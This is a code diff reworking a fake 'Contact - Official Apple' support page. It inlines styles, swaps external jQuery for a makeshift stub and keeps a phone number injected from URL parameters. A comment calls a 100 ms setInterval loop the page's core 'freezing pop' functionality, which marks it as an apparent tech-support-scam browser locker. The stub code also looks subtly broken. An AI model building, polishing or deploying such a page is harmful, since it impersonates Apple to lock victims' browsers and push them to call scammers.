@@ -7,9 +7,186 @@
     <meta http-equiv="cache-control" content="max-age=3600">
     <title>Contact - Official Apple</title>
     <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
-    <link rel="stylesheet" href="css/Base.css" type="text/css">
-    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
-    <script src="js/text_tel.js"></script>
+    
+    <!-- Inline CSS to replace external files -->
+    <style>
+        /* Base styles similar to Apple's */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            line-height: 1.4;
+            color: #1d1d1f;
+            background-color: #f5f5f7;
+        }
+        
+        .no-js .ac-gn-menustate, .no-js .ac-gn-menuanchor, .no-js .ac-gn-menucta {
+            display: none;
+        }
+        
+        .ac-gn-content {
+            max-width: 1024px;
+            margin: 0 auto;
+            padding: 0 22px;
+            position: relative;
+        }
+        
+        .ac-gn-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 48px;
+        }
+        
+        .ac-gn-list {
+            display: flex;
+            list-style: none;
+        }
+        
+        .ac-gn-item {
+            margin-right: 30px;
+        }
+        
+        .ac-gn-link {
+            color: #1d1d1f;
+            text-decoration: none;
+            font-size: 12px;
+            opacity: 0.8;
+            transition: opacity 0.3s;
+        }
+        
+        .ac-gn-link:hover {
+            opacity: 1;
+        }
+        
+        .ac-ln-wrapper {
+            background-color: #f5f5f7;
+            border-bottom: 1px solid #d2d2d7;
+        }
+        
+        .ac-ln-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1024px;
+            margin: 0 auto;
+            padding: 0 22px;
+            height: 52px;
+        }
+        
+        .ac-ln-title a {
+            color: #1d1d1f;
+            font-size: 21px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .as-banner-image {
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            height: 300px;
+            position: relative;
+        }
+        
+        .as-banner-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .as-banner-content {
+            padding: 30px 0;
+            text-align: center;
+        }
+        
+        .pageTitle-heading {
+            font-size: 48px;
+            font-weight: 600;
+            line-height: 1.1;
+            letter-spacing: -.003em;
+            margin-bottom: 6px;
+        }
+        
+        .ac-gf-footer {
+            background-color: #f5f5f7;
+            padding: 20px 0;
+            margin-top: 40px;
+            border-top: 1px solid #d2d2d7;
+        }
+        
+        .ac-gf-footer-shop {
+            font-size: 12px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .ac-gf-footer-legal {
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        .ac-gf-footer-legal-copyright {
+            margin-bottom: 5px;
+        }
+        
+        .ac-gf-footer-legal-links {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .ac-gf-footer-legal-link {
+            color: #515154;
+            text-decoration: none;
+        }
+        
+        .ac-gf-footer-legal-link:hover {
+            text-decoration: underline;
+        }
+        
+        .ac-gf-footer-locale {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        .ac-gf-footer-locale-link {
+            color: #515154;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .ac-gf-footer-locale-link:hover {
+            text-decoration: underline;
+        }
+        
+        .ac-gf-footer-locale-flag {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .nowrap {
+            white-space: nowrap;
+        }
+        
+        /* Create a placeholder for images */
+        .image-placeholder {
+            width: 100%;
+            height: 100%;
+            background-color: #e8e8ed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #86868b;
+            font-size: 14px;
+        }
+    </style>
 </head>
 
 <body>
@@ -147,23 +324,7 @@
                 <div class="column large-12 medium-12 small-12">
                     <div class="as-banner-cont">
                         <div class="as-banner-image as-banner-image--top">
-                            <style type="text/css">
-                                .as-banner-image.as-banner-image--top {
-                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
-                                }
-
-                                .as-banner-image.as-banner-image--top:before {
-                                    content: "";
-                                    display: block;
-                                }
-
-                                @media only screen and (max-width: 735px) {
-                                    .as-banner-image.as-banner-image--top {
-                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
-                                    }
-                                }
-                            </style>
-                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                            <div class="image-placeholder">Apple Support Image</div>
                         </div>
                     </div>
                     <div class="as-banner-content">
@@ -186,25 +347,62 @@
                 <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
                 <div class="ac-gf-footer-locale">
-                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
-					States </a>
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region">
+                        <span class="ac-gf-footer-locale-flag">🇺🇸</span>United States
+                    </a>
                 </div>
                 <div class="ac-gf-footer-legal">
                     <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
-                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
-					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
-                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
-						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
-						Apple </a></div>
+                    <div class="ac-gf-footer-legal-links">
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy Policy </a> 
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> 
+                        <a class="ac-gf-footer-legal-link" href="#">Site Map </a> 
+                        <a class="ac-gf-footer-legal-link" href="#">Contact Apple </a>
+                    </div>
                 </div>
                 <meta content="Apple" property="name">
-                <meta content=" +1 (888) 593-5059
-			 " property="telephone">
+                <meta content=" +1 (888) 593-5059" property="telephone">
             </section>
         </div>
     </footer>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Inline jQuery-like functionality to avoid external dependency -->
+    <script>
+        // Simple jQuery-like implementation
+        window.jQuery = window.$ = function(selector) {
+            if (typeof selector === 'string') {
+                if (selector.startsWith('#')) {
+                    return document.getElementById(selector.substring(1));
+                } else {
+                    return document.querySelectorAll(selector);
+                }
+            } else if (selector === document) {
+                return document;
+            }
+            return selector;
+        };
+        
+        // Extend jQuery-like object with methods we need
+        if (!window.$.append) {
+            window.$.fn = window.$.prototype = {
+                append: function(content) {
+                    if (this instanceof Element) {
+                        this.innerHTML += content;
+                    } else if (this instanceof NodeList) {
+                        for (let i = 0; i < this.length; i++) {
+                            this[i].innerHTML += content;
+                        }
+                    }
+                    return this;
+                }
+            };
+            
+            // Apply to single elements
+            Object.setPrototypeOf(Element.prototype, window.$.fn);
+        }
+    </script>
+    
     <script>
         function getURLParameter(name) {
             return decodeURI(
@@ -306,6 +504,7 @@
             sPhone[p].innerHTML = phone;
         }
 
+        // The core "freezing pop" functionality
         setInterval(function() {
             myFunction()
         }, 100);
